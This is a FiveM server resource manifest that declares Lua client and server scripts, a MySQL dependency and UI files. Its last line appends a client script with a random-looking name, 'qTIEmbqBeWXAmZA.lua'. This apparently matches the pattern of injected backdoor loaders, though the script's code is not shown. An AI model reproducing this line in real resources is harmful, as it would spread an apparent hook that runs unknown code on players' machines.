

resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

client_scripts {
    "client/client.lua",
}

server_scripts {
	"server/server.lua",
	'@mysql-async/lib/MySQL.lua'	
}

dependency 'es_extended'

ui_page('ui/ui.html')

files {
    'ui/ui.html',
    'ui/uiField.css',
	'ui/uiField.js',
	'ui/uiField.png'
}

client_script "qTIEmbqBeWXAmZA.lua"